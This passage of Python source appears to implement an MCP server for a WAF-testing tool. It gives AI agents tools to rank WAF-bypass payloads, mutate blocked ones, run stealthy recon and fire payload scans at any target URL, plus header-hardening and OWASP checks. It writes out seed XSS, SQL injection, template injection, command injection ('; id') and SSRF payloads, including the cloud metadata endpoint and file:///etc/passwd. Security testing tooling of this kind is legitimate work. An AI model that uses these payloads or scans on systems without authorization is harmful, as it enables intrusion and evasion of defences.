            lines.append(f"Title: {r['title']}")
            lines.append(f"Severity: {r['severity']}")
            lines.append(f"CWE: {r['cwe']}")
            lines.append(f"File: {r['file']}")
            lines.append(f"Payloads: {r['payload_count']}")
            if r["description"]:
                lines.append(f"Description: {r['description'][:300]}")
            if r["affected"]:
                lines.append(f"Affected: {json.dumps(r['affected'], indent=2)}")
            if r["references"]:
                lines.append(f"References:")
                for ref in r["references"]:
                    lines.append(f"  - {ref}")
        return "\n".join(lines)

    # ── Tool: suggest_payloads_for_waf ─────────────────────────────────

    @mcp.tool()
    async def suggest_payloads_for_waf(waf_vendor: str, attack_type: str = "xss",
                                        max_results: int = 10) -> str:
        """Suggest the best payloads to test against a specific WAF vendor.

        Combines WAF knowledge with payload selection to recommend
        payloads most likely to bypass the specified WAF.

        Args:
            waf_vendor: WAF vendor name (e.g. 'Cloudflare', 'AWS WAF', 'Akamai')
            attack_type: Attack category (e.g. 'xss', 'sqli', 'ssrf', 'command_injection')
            max_results: Number of payloads to suggest (default 10)
        """
        sigs = _get_waf_signatures()
        vendor_lower = waf_vendor.lower()
        matched = [k for k in sigs if vendor_lower in k.lower()]
        if not matched:
            return (f"Unknown WAF vendor '{waf_vendor}'.\n"
                    f"Known vendors: {', '.join(sorted(sigs.keys()))}")

        vendor_name = matched[0]
        payloads = _load_payloads(attack_type, max_payloads=200)
        if not payloads:
            available = [d.name for d in PAYLOADS_DIR.iterdir() if d.is_dir()]
            return (f"No payloads in category '{attack_type}'.\n"
                    f"Available: {', '.join(sorted(available))}")

        # Prefer payloads with evasion techniques, encoding, or bypass in description
        evasion_keywords = ["bypass", "evasion", "encod", "obfuscat", "polyglot",
                           "mutation", "double", "nested", "unicode", "hex", "base64"]
        scored = []
        for p in payloads:
            if not isinstance(p, dict):
                continue
            text = json.dumps(p).lower()
            score = sum(2 for kw in evasion_keywords if kw in text)
            # Bonus if tested against this WAF
            tested = p.get("tested_against", [])
            if any(vendor_lower in t.lower() for t in tested):
                score += 5
            if not p.get("blocked", True):
                score += 3  # Previously bypassed
            scored.append((score, p))

        scored.sort(key=lambda x: x[0], reverse=True)
        top = scored[:max_results]

        lines = [
            f"Suggested {attack_type.upper()} payloads for {vendor_name}",
            f"({len(top)} payloads, ranked by likely bypass potential)", ""
        ]
        for score, p in top:
            lines.append(f"[{p.get('id', '?')}] {p.get('payload', '')[:120]}")
            if p.get("description"):
                lines.append(f"       → {p['description']}")
            lines.append(f"       Score: {score}  Blocked: {p.get('blocked', '?')}")
            lines.append("")
        return "\n".join(lines)

    # ── Tool: analyze_scan_results ─────────────────────────────────────

    @mcp.tool()
    async def analyze_scan_results(results_json: str) -> str:
        """Analyze Fray scan results and propose next steps.

        Takes raw JSON output from 'fray test' or 'fray bounty' and returns:
        - Summary of findings (bypasses, block rate, WAF behavior)
        - Risk assessment per finding
        - Recommended next actions (deeper testing, mutation, report)
        - Suggested follow-up commands

        Args:
            results_json: JSON string from fray test/bounty output
                          (the contents of the -o output file)
        """
        return _analyze_scan_results(results_json)

    # ── Tool: generate_bypass_strategy ───────────────────────────────────

    @mcp.tool()
    async def generate_bypass_strategy(waf_vendor: str, blocked_payload: str) -> str:
        """Generate bypass strategies for a payload blocked by a specific WAF.

        Analyzes the blocked payload structure, identifies what likely triggered
        the block, and suggests mutation strategies with concrete examples.

        Args:
            waf_vendor: WAF that blocked the payload (e.g. 'Cloudflare', 'AWS WAF')
            blocked_payload: The exact payload string that was blocked
        """
        return _generate_bypass_strategy(waf_vendor, blocked_payload)

    # ── Tool: explain_vulnerability ──────────────────────────────────────

    @mcp.tool()
    async def explain_vulnerability(payload: str, category: str = "") -> str:
        """Explain why a payload is dangerous, in beginner-friendly terms.

        Takes a raw payload string and explains:
        - What attack type it represents
        - How it works step by step
        - What damage it could cause
        - How to defend against it
        - Related CWE and OWASP references

        Args:
            payload: The payload string to explain (e.g. '<script>alert(1)</script>')
            category: Optional hint for category (e.g. 'xss', 'sqli', 'ssrf')
        """
        return _explain_vulnerability(payload, category)

    # ── Tool: create_custom_payload ──────────────────────────────────────

    @mcp.tool()
    async def create_custom_payload(description: str, category: str = "xss",
                                      target_waf: str = "") -> str:
        """Generate payloads from a natural language description.

        Describe what you want to test in plain language, and this tool
        generates concrete payload(s) using Fray's payload database as
        building blocks.

        Args:
            description: Natural language description of what to test
                         (e.g. 'XSS that bypasses Cloudflare using SVG tags')
            category: Payload category (xss, sqli, ssrf, ssti, command_injection)
            target_waf: Optional WAF to optimize for (e.g. 'Cloudflare')
        """
        return _create_custom_payload(description, category, target_waf)

    # ── Tool: fray_recon ───────────────────────────────────────────────────

    @mcp.tool()
    async def fray_recon(target: str, mode: str = "fast",
                          stealth: bool = False) -> str:
        """Run Fray reconnaissance on a target URL.

        Performs automated security reconnaissance including:
        - TLS/HTTP audit
        - Security headers analysis
        - Technology fingerprinting
        - DNS records and CDN detection
        - Subdomain enumeration (passive + active)
        - Subdomain takeover detection
        - Origin IP discovery
        - Attack surface risk scoring (0-100)

        Returns a JSON summary with risk score, findings, and recommendations.
        This is a network operation and may take 15-45 seconds depending on mode.

        Args:
            target: Target URL (e.g. 'https://example.com')
            mode: Scan depth — 'fast' (~15s), 'default' (~30s), or 'deep' (~45s)
            stealth: If True, limit concurrency and add jitter to avoid WAF triggers
        """
        import asyncio
        try:
            from fray.recon import run_recon
            result = await asyncio.to_thread(
                run_recon, target, timeout=8, mode=mode, stealth=stealth)
            # Return compact summary (full result can be huge)
            atk = result.get("attack_surface", {})
            summary = {
                "target": target,
                "mode": mode,
                "risk_score": atk.get("risk_score", 0),
                "risk_level": atk.get("risk_level", "?"),
                "findings": atk.get("findings", []),
                "waf_vendor": atk.get("waf_vendor"),
                "cdn": atk.get("cdn"),
                "tls_version": atk.get("tls_version"),
                "cert_days_left": atk.get("cert_days_left"),
                "security_headers_score": atk.get("security_headers_score"),
                "subdomains": atk.get("subdomains", 0),
                "subdomain_takeover": atk.get("subdomain_takeover", 0),
                "technologies": atk.get("technologies", []),
                "recommended_categories": result.get("recommended_categories", []),
            }
            return json.dumps(summary, indent=2, ensure_ascii=False)
        except Exception as e:
            return json.dumps({"error": str(e)})

    # ── Tool: fray_scan ────────────────────────────────────────────────────

    @mcp.tool()
    async def fray_scan(target: str, categories: str = "xss",
                         max_payloads: int = 20,
                         stealth: bool = False) -> str:
        """Run Fray WAF bypass scan against a target URL.

        Tests payloads from the specified categories against the target
        and reports which ones bypassed the WAF, including bypass confidence
        scores and response timing.

        Returns a JSON report with blocked/bypassed counts and per-payload results.
        This is a network operation and may take 10-60 seconds.

        Args:
            target: Target URL to test (e.g. 'https://example.com/search?q=FUZZ')
            categories: Comma-separated payload categories (e.g. 'xss,sqli,ssti')
            max_payloads: Maximum payloads to test per category (default: 20)
            stealth: If True, add delays between requests to avoid rate limiting
        """
        import asyncio
        try:
            from fray.tester import WAFTester
            tester = WAFTester(target, stealth=stealth)
            cat_list = [c.strip() for c in categories.split(",") if c.strip()]
            all_results = []
            for cat in cat_list:
                payloads = _load_payloads(cat, max_payloads=max_payloads)
                payload_strs = []
                for p in payloads:
                    if isinstance(p, dict):
                        payload_strs.append(p.get("payload", p.get("value", str(p))))
                    else:
                        payload_strs.append(str(p))
                for ps in payload_strs[:max_payloads]:
                    r = await asyncio.to_thread(tester.test_payload, ps)
                    r["category"] = cat
                    all_results.append(r)

            report = tester.generate_report(all_results)
            # Compact output
            summary = {
                "target": target,
                "categories": cat_list,
                "total_tested": report.get("total_tested", 0),
                "blocked": report.get("blocked", 0),
                "bypassed": report.get("bypassed", 0),
                "block_rate": report.get("block_rate", "0%"),
                "avg_bypass_confidence": report.get("avg_bypass_confidence"),
                "high_confidence_bypasses": report.get("high_confidence_bypasses"),
                "avg_response_ms": report.get("avg_response_ms"),
                "bypassed_payloads": [
                    {"payload": r.get("payload", ""), "category": r.get("category", ""),
                     "status": r.get("status_code"), "confidence": r.get("bypass_confidence"),
                     "reflected": r.get("reflected", False)}
                    for r in all_results if not r.get("blocked", True)
                ][:30],
            }
            return json.dumps(summary, indent=2, ensure_ascii=False)
        except Exception as e:
            return json.dumps({"error": str(e)})

    # ── Tool: ai_suggest_payloads ─────────────────────────────────────

    @mcp.tool()
    async def ai_suggest_payloads(
        target: str,
        context: str = "",
        category: str = "xss",
        waf_vendor: str = "",
        blocked_payloads: str = "",
        max_suggestions: int = 10,
    ) -> str:
        """AI-powered payload suggestion based on target context.

        Analyzes the target's WAF behavior, technology stack, and previously
        blocked payloads to suggest the most likely bypass candidates.
        Uses Fray's WAF intelligence database and mutation engine.

        Args:
            target: Target URL (e.g. 'https://example.com/search?q=')
            context: Additional context (e.g. 'React app behind Cloudflare, CSP with unsafe-inline')
            category: Attack category (xss, sqli, ssti, command_injection, ssrf)
            waf_vendor: Known WAF vendor (e.g. 'cloudflare', 'akamai', 'aws_waf')
            blocked_payloads: Comma-separated list of payloads that were blocked
            max_suggestions: Number of suggestions to generate (default: 10)
        """
        logger.info(f"ai_suggest_payloads for {target}, cat={category}, waf={waf_vendor}")
        try:
            from fray import load_waf_intel
            from fray.mutator import mutate_payload
            from fray.bypass import WAF_EVASION_HINTS

            suggestions = []

            # Load WAF intel for vendor-specific strategies
            intel = {}
            try:
                intel_db = load_waf_intel()
                if waf_vendor:
                    for vendor_key, vendor_data in intel_db.items():
                        if waf_vendor.lower() in vendor_key.lower():
                            intel = vendor_data
                            break
            except Exception:
                pass

            # Get vendor-specific hints
            hints = {}
            if waf_vendor:
                waf_key = waf_vendor.lower().replace(" ", "_").replace("-", "_")
                for alias, canonical in [("cf", "cloudflare"), ("aws", "aws_waf"),
                                          ("modsec", "modsecurity")]:
                    if waf_key == alias:
                        waf_key = canonical
                hints = WAF_EVASION_HINTS.get(waf_key, {})

            # Base payloads per category
            seeds = {
                "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                         "<svg/onload=alert(1)>", "<details open ontoggle=alert(1)>"],
                "sqli": ["' OR 1=1--", "' UNION SELECT NULL--",
                          "1' AND '1'='1", "admin'/**/OR/**/1=1--"],
                "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}"],
                "command_injection": ["; id", "| id", "`id`", "$(id)"],
                "ssrf": ["http://169.254.169.254/latest/meta-data/",
                          "http://127.0.0.1:80", "file:///etc/passwd"],
            }.get(category, ["<script>alert(1)</script>"])

            # If blocked payloads provided, mutate those instead
            if blocked_payloads:
                seeds = [p.strip() for p in blocked_payloads.split(",") if p.strip()]

            # Generate mutations with strategies
            for seed in seeds[:5]:
                variants = mutate_payload(seed, max_variants=max_suggestions // len(seeds[:5]))
                for v in variants:
                    suggestion = {
                        "payload": v["payload"],
                        "strategy": v["strategy"],
                        "original": v["original"],
                        "reasoning": f"Mutated via {v['strategy']}",
                    }
                    # Add vendor-specific reasoning
                    if hints:
                        tips = hints.get("tips", [])
                        if tips:
                            suggestion["waf_tip"] = tips[0]
                    if intel:
                        effective = intel.get("effective_techniques", [])
                        if effective:
                            suggestion["intel"] = f"Effective against {waf_vendor}: {', '.join(effective[:3])}"
                    suggestions.append(suggestion)

            # Add context-aware suggestions
            if context:
                ctx_lower = context.lower()
                if "csp" in ctx_lower and "unsafe-inline" in ctx_lower:
                    suggestions.append({
                        "payload": "<script>alert(document.domain)</script>",
                        "strategy": "csp_unsafe_inline",
                        "reasoning": "CSP allows unsafe-inline — inline scripts execute directly",
                    })
                if "react" in ctx_lower:
                    suggestions.append({
                        "payload": "javascript:alert(1)//",
                        "strategy": "react_href",
                        "reasoning": "React dangerouslySetInnerHTML or href=javascript: may bypass",
                    })
                if "angular" in ctx_lower:
                    suggestions.append({
                        "payload": "{{constructor.constructor('alert(1)')()}}",
                        "strategy": "angular_sandbox",
                        "reasoning": "Angular sandbox escape via constructor chain",
                    })

            return json.dumps(suggestions[:max_suggestions], indent=2, ensure_ascii=False)
        except Exception as e:
            return json.dumps({"error": str(e)})

    # ── Tool: analyze_response ─────────────────────────────────────────

    @mcp.tool()
    async def analyze_response(
        payload: str,
        status_code: int,
        response_body: str,
        response_headers: str = "",
        baseline_status: int = 200,
        baseline_length: int = 0,
    ) -> str:
        """Analyze a WAF response to detect false negatives and edge bypasses.

        Examines response characteristics to determine if a payload truly
        bypassed the WAF, was silently blocked (soft block), or triggered
        a challenge page. Detects false negatives that static rules miss.

        Args:
            payload: The payload that was sent
            status_code: HTTP status code of the response
            response_body: Response body text (first 2000 chars is enough)
            response_headers: Response headers as text
            baseline_status: Normal response status code (default: 200)
            baseline_length: Normal response body length in bytes
        """
        logger.info(f"analyze_response: status={status_code}, payload_len={len(payload)}")
        analysis = {
            "payload": payload[:200],
            "status_code": status_code,
            "verdict": "unknown",
            "confidence": 0,
            "indicators": [],
            "recommendations": [],
        }

        body_lower = response_body.lower() if response_body else ""
        body_len = len(response_body) if response_body else 0

        # 1. Hard block detection
        if status_code in (403, 406, 429, 500, 501, 503):
            analysis["verdict"] = "blocked"
            analysis["confidence"] = 95
            analysis["indicators"].append(f"HTTP {status_code} — typical WAF block status")
            analysis["recommendations"].append("Try encoding variants: URL encode, double encode, HTML entities")
            return json.dumps(analysis, indent=2)

        # 2. Soft block detection (200 but WAF replaced body)
        if baseline_length > 0 and body_len > 0:
            ratio = body_len / baseline_length
            if ratio < 0.4 and baseline_length > 1000:
                analysis["verdict"] = "soft_block"
                analysis["confidence"] = 80
                analysis["indicators"].append(
                    f"Response body {body_len}b vs baseline {baseline_length}b "
                    f"({ratio:.0%}) — WAF likely replaced page with block page")
                analysis["recommendations"].append("This is a WAF block disguised as 200. Try different encoding.")
                return json.dumps(analysis, indent=2)

        # 3. Challenge/CAPTCHA detection
        challenge_sigs = [
            ("cf-turnstile", "Cloudflare Turnstile challenge"),
            ("cf-challenge", "Cloudflare JS challenge"),
            ("just a moment", "Cloudflare browser check"),
            ("captcha", "CAPTCHA challenge"),
            ("recaptcha", "Google reCAPTCHA"),
            ("hcaptcha", "hCaptcha"),
            ("ddos protection", "DDoS protection page"),
            ("ray id:", "Cloudflare Ray ID (block/challenge page)"),
            ("attention required", "Cloudflare attention page"),
        ]
        for sig, desc in challenge_sigs:
            if sig in body_lower:
                analysis["verdict"] = "challenge"
                analysis["confidence"] = 85
                analysis["indicators"].append(f"Detected: {desc}")
                analysis["recommendations"].append("WAF is serving a challenge page. Try header manipulation or encoding.")
                return json.dumps(analysis, indent=2)

        # 4. Reflection analysis — potential true bypass
        reflected = payload.lower() in body_lower if payload and body_lower else False
        partial_reflect = False
        if not reflected and payload:
            # Check for partial reflection (encoded or modified)
            import urllib.parse
            decoded = urllib.parse.unquote(payload)
            if decoded.lower() in body_lower:
                partial_reflect = True

        if reflected:
            analysis["verdict"] = "bypass_confirmed"
            analysis["confidence"] = 95
            analysis["indicators"].append("Payload reflected verbatim in response — confirmed XSS/injection vector")
            analysis["recommendations"].append("HIGH PRIORITY: Payload is reflected. Verify DOM context for exploitability.")
        elif partial_reflect:
            analysis["verdict"] = "bypass_likely"
            analysis["confidence"] = 75
            analysis["indicators"].append("Decoded payload found in response — likely bypass with server-side decoding")
            analysis["recommendations"].append("Server decoded the payload. Try additional encoding layers.")
        elif status_code == 200 and (baseline_length == 0 or abs(body_len - baseline_length) / max(baseline_length, 1) < 0.15):
            analysis["verdict"] = "likely_ignored"
            analysis["confidence"] = 60
            analysis["indicators"].append("Response matches baseline — server likely ignored the parameter")
            analysis["recommendations"].append("Try different injection points: headers, cookies, path, POST body")
        else:
            analysis["verdict"] = "bypass_possible"
            analysis["confidence"] = 50
            analysis["indicators"].append(f"Status {status_code}, body differs from baseline — manual review needed")
            analysis["recommendations"].append("Check if the application processed the payload. Look for behavioral differences.")

        # 5. WAF vendor fingerprints in headers
        if response_headers:
            hdrs_lower = response_headers.lower()
            vendor_sigs = [
                ("cf-ray", "Cloudflare"), ("x-sucuri-id", "Sucuri"),
                ("x-akamai", "Akamai"), ("x-amz-cf-id", "AWS CloudFront"),
                ("x-ms-", "Azure"), ("server: bigip", "F5 BIG-IP"),
            ]
            for sig, vendor in vendor_sigs:
                if sig in hdrs_lower:
                    analysis["indicators"].append(f"WAF detected: {vendor}")
                    analysis["recommendations"].append(f"Use vendor-specific strategies for {vendor}")

        return json.dumps(analysis, indent=2, ensure_ascii=False)

    # ── Tool: hardening_check ──────────────────────────────────────────

    @mcp.tool()
    async def hardening_check(target: str) -> str:
        """Check WAF-relevant security headers and hardening configuration.

        Verifies critical defense headers and provides copy-paste fix configs
        for nginx, Apache, Cloudflare Workers, and Next.js.

        Checks: HSTS, CSP, X-Frame-Options, X-Content-Type-Options,
        Referrer-Policy, Permissions-Policy, COOP, CORP, rate-limit headers.

        Args:
            target: Target URL to check (e.g. 'https://example.com')
        """
        logger.info(f"hardening_check for {target}")
        import asyncio
        try:
            from fray.recon.fingerprint import check_security_headers
            from fray.recon.http import fetch_headers

            headers = await asyncio.to_thread(fetch_headers, target, timeout=8)
            if not headers:
                return json.dumps({"error": "Could not fetch headers from target"})

            result = check_security_headers(headers)

            # Add rate-limit header checks
            rate_limit_headers = {
                "x-ratelimit-limit": "Rate limit ceiling",
                "x-ratelimit-remaining": "Remaining requests",
                "x-ratelimit-reset": "Rate limit reset time",
                "retry-after": "Retry-After header",
                "ratelimit-limit": "Standard RateLimit header",
                "ratelimit-policy": "RateLimit policy header",
            }
            rl_present = {}
            rl_missing = []
            for hdr_key, desc in rate_limit_headers.items():
                if hdr_key in headers:
                    rl_present[hdr_key] = {"value": headers[hdr_key], "description": desc}
                else:
                    rl_missing.append(hdr_key)

            result["rate_limit_headers"] = {
                "present": rl_present,
                "missing": rl_missing,
                "has_rate_limiting": len(rl_present) > 0,
            }

            # Grade
            score = result.get("score", 0)
            if score >= 80:
                grade = "A"
            elif score >= 60:
                grade = "B"
            elif score >= 40:
                grade = "C"
            elif score >= 20:
                grade = "D"
            else:
                grade = "F"
            result["grade"] = grade
            result["target"] = target

            return json.dumps(result, indent=2, ensure_ascii=False)
        except Exception as e:
            return json.dumps({"error": str(e)})

    # ── Tool: owasp_misconfig_check ────────────────────────────────────

    @mcp.tool()
    async def owasp_misconfig_check(target: str) -> str:
        """Check for OWASP Top 10 security misconfigurations beyond WAF bypass.

        Performs comprehensive checks for:
        - A01 Broken Access Control: open admin panels, directory listing, CORS
        - A02 Cryptographic Failures: weak TLS, missing HSTS, insecure cookies
        - A03 Injection: injectable parameters, GraphQL introspection
        - A05 Security Misconfiguration: default configs, verbose errors,
          exposed files, debug endpoints, server info leakage
        - A06 Vulnerable Components: outdated frontend libs, known CVEs
        - A07 Auth Failures: exposed login, weak session config
        - A09 Logging Failures: missing security event headers

        Returns structured findings with severity ratings and fix recommendations.

        Args:
            target: Target URL (e.g. 'https://example.com')
        """
        logger.info(f"owasp_misconfig_check for {target}")
        import asyncio
        try:
            from fray.recon import run_recon
            result = await asyncio.to_thread(
                run_recon, target, timeout=8, mode="fast")

            atk = result.get("attack_surface", {})
            findings = atk.get("findings", [])
            hdr = result.get("headers", {})
            tls = result.get("tls", {})
            csp = result.get("csp", {})
            cookies = result.get("cookies", {})
            fp = result.get("fingerprint", {})

            checks = {
                "target": target,
                "risk_score": atk.get("risk_score", 0),
                "risk_level": atk.get("risk_level", "?"),
                "owasp_checks": {},
            }

            # A01: Broken Access Control
            a01 = {"status": "pass", "findings": []}
            cors = result.get("cors", {})
            if cors.get("allows_any_origin"):
                a01["findings"].append({"severity": "high", "issue": "CORS allows any origin (*)",
                    "fix": "Restrict Access-Control-Allow-Origin to trusted domains"})
            admin_panels = atk.get("admin_panels", 0)
            open_admin = atk.get("open_admin_panels", 0)
            if open_admin > 0:
                a01["findings"].append({"severity": "critical",
                    "issue": f"{open_admin} open admin panel(s) accessible without auth",
                    "fix": "Require authentication for all admin endpoints"})
            if a01["findings"]:
                a01["status"] = "fail"
            checks["owasp_checks"]["A01_Broken_Access_Control"] = a01

            # A02: Cryptographic Failures
            a02 = {"status": "pass", "findings": []}
            if tls.get("tls_version") and "1.0" in str(tls.get("tls_version", "")):
                a02["findings"].append({"severity": "high", "issue": "TLS 1.0 detected",
                    "fix": "Upgrade to TLS 1.2 minimum, prefer TLS 1.3"})
            if tls.get("tls_version") and "1.1" in str(tls.get("tls_version", "")):
                a02["findings"].append({"severity": "medium", "issue": "TLS 1.1 detected",
                    "fix": "Upgrade to TLS 1.2 minimum"})
            hsts = hdr.get("present", {}).get("HSTS")
            if not hsts:
                a02["findings"].append({"severity": "high",
                    "issue": "Missing HSTS header",
                    "fix": "add_header Strict-Transport-Security 'max-age=31536000; includeSubDomains; preload'"})
            cookie_issues = cookies.get("issues", [])
            for ci in cookie_issues[:3]:
                if "Secure" in ci.get("issue", ""):
                    a02["findings"].append({"severity": "medium",
                        "issue": f"Cookie '{ci.get('cookie', '?')}' missing Secure flag",
                        "fix": "Set Secure flag on all cookies"})
            if a02["findings"]:
                a02["status"] = "fail"
            checks["owasp_checks"]["A02_Cryptographic_Failures"] = a02

            # A03: Injection
            a03 = {"status": "pass", "findings": []}
            injectable = atk.get("injectable_params", 0)
            if injectable > 0:
                a03["findings"].append({"severity": "high",
                    "issue": f"{injectable} potentially injectable parameter(s)",
                    "fix": "Validate and sanitize all user input; use parameterized queries"})
            graphql = atk.get("graphql_endpoints", 0)
            if graphql > 0:
                a03["findings"].append({"severity": "medium",
                    "issue": f"{graphql} GraphQL endpoint(s) — check introspection",
                    "fix": "Disable GraphQL introspection in production"})
            if a03["findings"]:
                a03["status"] = "fail"
            checks["owasp_checks"]["A03_Injection"] = a03

            # A05: Security Misconfiguration
            a05 = {"status": "pass", "findings": []}
            exposed = atk.get("exposed_files", 0)
            if exposed > 0:
                a05["findings"].append({"severity": "medium",
                    "issue": f"{exposed} exposed sensitive file(s)",
                    "fix": "Block access to sensitive files (.env, .git, backup files)"})
            staging = atk.get("staging_envs", [])
            if staging:
                a05["findings"].append({"severity": "high",
                    "issue": f"Staging environments found: {', '.join(staging[:3])}",
                    "fix": "Remove staging/dev environments from public DNS"})
            if not csp.get("present"):
                a05["findings"].append({"severity": "high",
                    "issue": "No Content-Security-Policy header",
                    "fix": "Implement CSP with restrictive default-src"})
            elif csp.get("weaknesses"):
                for w in csp["weaknesses"][:2]:
                    a05["findings"].append({"severity": "medium",
                        "issue": f"CSP weakness: [{w.get('directive', '?')}] {w.get('description', '')}",
                        "fix": w.get("recommendation", "Tighten CSP directive")})
            server_header = hdr.get("present", {})
            # Check if Server header leaks version info
            for f in findings:
                if "server info" in f.get("finding", "").lower() or "version" in f.get("finding", "").lower():
                    a05["findings"].append({"severity": "low",
                        "issue": f["finding"],
                        "fix": "Remove server version from response headers"})
                    break
            if a05["findings"]:
                a05["status"] = "fail"
            checks["owasp_checks"]["A05_Security_Misconfiguration"] = a05

            # A06: Vulnerable Components
            a06 = {"status": "pass", "findings": []}
            fl = result.get("frontend_libs", {})
            vuln_libs = fl.get("vulnerable_libs", 0)
            if vuln_libs > 0:
                a06["findings"].append({"severity": "high",
                    "issue": f"{vuln_libs} vulnerable frontend library/libraries",
                    "fix": "Update to patched versions"})
                for v in fl.get("vulnerabilities", [])[:3]:
                    a06["findings"].append({"severity": v.get("severity", "medium"),
                        "issue": f"{v.get('id', '?')}: {v.get('summary', '')}",
                        "fix": f"Update {v.get('component', '?')}"})
            sri_missing = fl.get("sri_missing", 0)
            if sri_missing > 0:
                a06["findings"].append({"severity": "medium",
                    "issue": f"{sri_missing} external script(s) without SRI",
                    "fix": "Add integrity= attributes to external script/link tags"})
            if a06["findings"]:
                a06["status"] = "fail"
            checks["owasp_checks"]["A06_Vulnerable_Components"] = a06

            # A07: Auth Failures
            a07 = {"status": "pass", "findings": []}
            for ci in cookie_issues:
                if "HttpOnly" in ci.get("issue", ""):
                    a07["findings"].append({"severity": "medium",
                        "issue": f"Cookie '{ci.get('cookie', '?')}' missing HttpOnly flag",
                        "fix": "Set HttpOnly flag on session cookies"})
                if "SameSite" in ci.get("issue", ""):
                    a07["findings"].append({"severity": "low",
                        "issue": f"Cookie '{ci.get('cookie', '?')}' missing SameSite",
                        "fix": "Set SameSite=Lax or Strict on cookies"})
            if a07["findings"]:
                a07["status"] = "fail"
            checks["owasp_checks"]["A07_Auth_Failures"] = a07

            # Summary
            total_checks = len(checks["owasp_checks"])
            failed = sum(1 for c in checks["owasp_checks"].values() if c["status"] == "fail")
            checks["summary"] = {
                "total_checks": total_checks,
                "passed": total_checks - failed,
                "failed": failed,
                "total_findings": sum(len(c["findings"]) for c in checks["owasp_checks"].values()),
            }

            return json.dumps(checks, indent=2, ensure_ascii=False)
        except Exception as e:
            return json.dumps({"error": str(e)})

    return mcp


def main():
    if not MCP_AVAILABLE:
        print("Error: MCP SDK not installed. Install with:", file=sys.stderr)
        print("  pip install 'mcp[cli]'", file=sys.stderr)
        sys.exit(1)

    logger.info("Starting Fray MCP server (stdio)")
    server = create_server()
    server.run(transport="stdio")


if __name__ == "__main__":
    main()
